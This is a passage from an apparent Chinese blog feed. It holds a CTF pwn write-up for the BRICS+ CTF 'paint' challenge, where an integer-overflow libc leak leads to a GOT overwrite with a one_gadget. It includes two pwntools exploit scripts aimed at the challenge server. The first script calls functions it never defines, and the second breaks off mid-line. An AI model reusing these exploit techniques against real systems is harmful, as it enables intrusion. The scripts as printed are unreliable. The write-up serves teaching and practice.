<span class=\"string\">&quot;安装patchelf时出现错误&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装patchelf失败，正在进行第<span class=\"variable\">$i</span>次重试...&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">##  seccomp //安装失败</span></span><br><span class=\"line\"><span class=\"comment\">## ruby版本会和上面那个onegadget冲突吗??</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (( i=1; i&lt;=<span class=\"variable\">$MAX_RETRY</span>; i++ )); <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (add-apt-repository ppa:brightbox/ruby-ng;apt-get install ruby2.6 ruby2.6-dev ;gem install seccomp-tools); <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$i</span> -eq <span class=\"variable\">$MAX_RETRY</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装seccomp时出现错误&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装seccomp失败，正在进行第<span class=\"variable\">$i</span>次重试...&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h2><p>pip还是pip3呢</p>\n<p>还有一些小问题、以及还有其他有用工具没安装</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://blog.csdn.net/mandiheyanyu/article/details/122455348\">https://blog.csdn.net/mandiheyanyu/article/details/122455348</a></p>\n<p>安装工具参考: <a href=\"https://blingblingxuanxuan.github.io/2020/02/23/paper/\">https://blingblingxuanxuan.github.io/2020/02/23/paper/</a></p>\n",
            "tags": [
                "PWN入门",
                "脚本"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-42-BRICS-CTF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%80%E9%A2%98/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-42-BRICS-CTF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%80%E9%A2%98/",
            "title": "pwn入门-42-BRICS+CTF-整数溢出一题",
            "date_published": "2023-09-28T09:27:01.000Z",
            "content_html": "<p>题目:paint    附件: 本链接地址+ paint.zip</p>\n<h2 id=\"dockerfile使用\"><a href=\"#dockerfile使用\" class=\"headerlink\" title=\"dockerfile使用\"></a>dockerfile使用</h2><p>执行命令进行构建</p>\n<p>[root@docker Dockerfile]#docker build -t ctfpwn .<br>上条命令中build为构建镜像，而参数t则指定镜像name，.则为Dockerfile的路径</p>\n<p>进去后找libc</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@ff854125b9c3:/<span class=\"meta\"># chmod +x /lib/x86_64-linux-gnu/libc.so.6</span></span><br><span class=\"line\">root@ff854125b9c3:/# /lib/x86_64-linux-gnu/libc.so<span class=\"number\">.6</span></span><br><span class=\"line\">GNU C <span class=\"title function_\">Library</span> <span class=\"params\">(Ubuntu GLIBC <span class=\"number\">2.35</span><span class=\"number\">-0u</span>buntu3<span class=\"number\">.1</span>)</span> stable release version 2.35.</span><br><span class=\"line\"><span class=\"title function_\">Copyright</span> <span class=\"params\">(C)</span> 2022 Free Software Foundation, Inc.</span><br><span class=\"line\">This is <span class=\"built_in\">free</span> software; see the source <span class=\"keyword\">for</span> copying conditions.</span><br><span class=\"line\">There is NO warranty; not even <span class=\"keyword\">for</span> MERCHANTABILITY or FITNESS FOR A</span><br><span class=\"line\">PARTICULAR PURPOSE.</span><br><span class=\"line\">Compiled by GNU CC version <span class=\"number\">11.2</span><span class=\"number\">.0</span>.</span><br><span class=\"line\">libc ABIs: UNIQUE IFUNC ABSOLUTE</span><br><span class=\"line\">For bug reporting instructions, please see:</span><br><span class=\"line\">&lt;https:<span class=\"comment\">//bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p>后面可以上脚本搭建环境调试, 准备好自己那个脚本</p>\n<p>glibc-allinone的源有时候不行，找到了一个有的</p>\n<p><a href=\"https://ubuntu.repo.cure.edu.uy/mirror/pool/main/g/glibc/\">https://ubuntu.repo.cure.edu.uy/mirror/pool/main/g/glibc/</a></p>\n<h2 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h2><h3 id=\"画布结构\"><a href=\"#画布结构\" class=\"headerlink\" title=\"画布结构\"></a>画布结构</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">                    +---------+----------+--------------------+</span><br><span class=\"line\">                    |                    |                    |</span><br><span class=\"line\">                    |                    |    chunk head      |</span><br><span class=\"line\">                    |                    |                    |</span><br><span class=\"line\">                    +---------+----------+-----------------+--+</span><br><span class=\"line\">canvas[idx] -&gt;      +---------+----------+--------------------+</span><br><span class=\"line\">                    |                    |                    |</span><br><span class=\"line\">                    |          v3   v2   | v0+<span class=\"number\">8</span> <span class=\"built_in\">malloc</span> canvas |</span><br><span class=\"line\">                    |                    |                    |</span><br><span class=\"line\">                    +---------+----------+-----------------+--+</span><br><span class=\"line\">canvas[idx] + <span class=\"number\">16</span> -&gt; +---------+----------+--------------------+</span><br><span class=\"line\">                    |                    |                    |</span><br><span class=\"line\">                    |      rate          |    comment addr    |</span><br><span class=\"line\">                    |                    |                    |</span><br><span class=\"line\">                    +---------+----------+-----------------+--+</span><br><span class=\"line\"></span><br><span class=\"line\">     </span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"泄漏libc地址\"><a href=\"#泄漏libc地址\" class=\"headerlink\" title=\"泄漏libc地址\"></a>泄漏libc地址</h3><p>​\t\t<font color=\"red\">数字不一定是正的,可以输入负的!!!  注意学习这种漏洞思维</font>, 可以看到canvas前面有libc的函数,可以利用这个来泄漏地址</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-42-BRICS-CTF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%80%E9%A2%98/image-20230926190630226-1695726390524-1.png\" alt=\"image-20230926190630226\"></p>\n<h3 id=\"修改got表指针为onegadget\"><a href=\"#修改got表指针为onegadget\" class=\"headerlink\" title=\"修改got表指针为onegadget\"></a>修改got表指针为onegadget</h3><p>​\t\t其实本质就是利用负数溢出，让操作以为是在操作堆块，找到对应的位置进行操作即可，</p>\n<p>​\t\trate(-8,0x222,’\\x08\\x01’*4+p64(addr))   </p>\n<p>​\t\t这里的话,<font color=\"red\">会把-8这个位置当成画布结构数据区开头</font>, 第一个圈起来的位置则是存放comment chunk 地址的,然后再给comment赋值’\\x08\\x01’*4+p64(addr)</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-42-BRICS-CTF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%80%E9%A2%98/image-20230926192156596.png\" alt=\"image-20230926192156596\"></p>\n<p>​\t\tdraw(-5,p64(one))   -5是红色位置,<font color=\"red\">这里又把-5开始的位置当成了画布结构的数据区开头</font> 在draw函数里就是canvas[idx],这是画布的上层结构,而画布内容的存储位置是蓝色的, <font color=\"red\">这里就可以对蓝色指向的地址进行修改了,也就是got表</font></p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-42-BRICS-CTF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%80%E9%A2%98/image-20230928172822667.png\" alt=\"image-20230928172822667\" style=\"zoom:50%;\">\n\n<img src=\"/pwn%E5%85%A5%E9%97%A8-42-BRICS-CTF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%80%E9%A2%98/image-20230928172835585.png\" alt=\"image-20230928172835585\" style=\"zoom:50%;\">\n\n<p>​\t\t往画布里,也就是got表进行修改, 改成onegadget</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-42-BRICS-CTF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%80%E9%A2%98/image-20230928153346749.png\" alt=\"image-20230928153346749\" style=\"zoom:50%;\">\n\n\n\n<p>​\t\t(这里地址不对,不是同一次调试的,gdb里有pie),但是原理一样,read后,把got表改成了onegadget</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-42-BRICS-CTF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%80%E9%A2%98/image-20230926192740096.png\" alt=\"image-20230926192740096\"></p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><p>python2版本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">context.log_level=<span class=\"literal\">True</span></span><br><span class=\"line\"><span class=\"comment\">#elf=ELF(&#x27;pwn&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;libc.so.6&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=process(&#x27;./vuln&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#p=process(&#x27;./pwn&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;paint-71ae86dc10a3fe17.brics-ctf.ru&#x27;</span>,<span class=\"number\">13003</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\"><span class=\"built_in\">id</span>,wid,hei</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter idx: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter canvas width (1-255): &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(wid))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter canvas height (1-255): &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(hei))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">resize</span>(<span class=\"params\"><span class=\"built_in\">id</span>,wid,hei</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter idx: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter new width (1-255): &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(wid))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter new height (1-255): &#x27;</span>)</span><br><span class=\"line\">\tp.send(<span class=\"built_in\">str</span>(hei))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">draw</span>(<span class=\"params\"><span class=\"built_in\">id</span>,data</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter idx: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;` chars in `height` lines):&#x27;</span>)</span><br><span class=\"line\">\t<span class=\"comment\">#for i in range(wid):</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tp.send(<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;6&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter idx: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter idx: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">comment</span>(<span class=\"params\"><span class=\"built_in\">id</span>,x,rate</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;5&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter idx: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter rate: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(x))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;ment (y/n): &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;y&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;r your comment: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(rate))</span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#泄漏地址</span></span><br><span class=\"line\">show(-<span class=\"number\">2</span>)</span><br><span class=\"line\">p.recv(<span class=\"number\">0xf</span>)</span><br><span class=\"line\">leak=u64(p.recv(<span class=\"number\">8</span>))-<span class=\"number\">0x1300</span></span><br><span class=\"line\">libcbase=leak-(<span class=\"number\">0x7ffff7fad780</span>-<span class=\"number\">0x00007ffff7d93000</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(leak)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(libcbase)</span><br><span class=\"line\"></span><br><span class=\"line\">addr=libcbase+<span class=\"number\">0x219098</span></span><br><span class=\"line\">edit(-<span class=\"number\">8</span>,<span class=\"number\">0x222</span>,<span class=\"string\">&#x27;\\x08\\x01&#x27;</span>*<span class=\"number\">4</span>+p64(addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#system=libcbase+libc.sym[&#x27;/bin/sh\\x00&#x27;]</span></span><br><span class=\"line\"></span><br><span class=\"line\">one=libcbase+<span class=\"number\">0xebcf8</span></span><br><span class=\"line\">drow(-<span class=\"number\">5</span>,p64(one))</span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>上述是修改过的,下面是队友原exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">context.log_level=<span class=\"literal\">True</span></span><br><span class=\"line\"><span class=\"comment\">#elf=ELF(&#x27;pwn&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;libc.so.6&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=process(&#x27;./vuln&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#p=process(&#x27;./pwn&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;paint-71ae86dc10a3fe17.brics-ctf.ru&#x27;</span>,<span class=\"number\">13003</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\"><span class=\"built_in\">id</span>,wid,hei</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter idx: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter canvas width (1-255): &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(wid))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter canvas height (1-255): &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(hei))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">re</span>(<span class=\"params\"><span class=\"built_in\">id</span>,wid,hei</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter idx: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter new width (1-255): &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(wid))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter new height (1-255): &#x27;</span>)</span><br><span class=\"line\">\tp.send(<span class=\"built_in\">str</span>(hei))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">drow</span>(<span class=\"params\"><span class=\"built_in\">id</span>,data</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter idx: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;` chars in `height` lines):&#x27;</span>)</span><br><span class=\"line\">\t<span class=\"comment\">#for i in range(wid):</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tp.send(<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;6&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter idx: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter idx: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\"><span class=\"built_in\">id</span>,x,rate</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;5&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter idx: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter rate: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(x))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;ment (y/n): &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;y&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;r your comment: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(rate))</span><br><span class=\"line\">\t</span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">8</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#edit(0,0x20,&#x27;a&#x27;*0x10)</span></span><br><span class=\"line\"><span class=\"comment\">#re(0,0x21,0x20)</span></span><br><span class=\"line\"><span class=\"comment\">#show(-8)</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#add(1,1,0xf)</span></span><br><span class=\"line\">show(-<span class=\"number\">2</span>)</span><br><span class=\"line\">p.recv(<span class=\"number\">0xf</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">leak=u64(p.recv(<span class=\"number\">8</span>))-<span class=\"number\">0x1300</span></span><br><span class=\"line\">libcbase=leak-(<span class=\"number\">0x7ffff7fad780</span>-<span class=\"number\">0x00007ffff7d93000</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(leak)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(libcbase)</span><br><span class=\"line\"><span class=\"comment\">#attach(p,&#x27;b *0x00005555555557a3&#x27;)</span></span><br><span class=\"line\">pause()</span><br><span class=\"line\"><span class=\"comment\">#delete(0)</span></span><br><span class=\"line\"><span 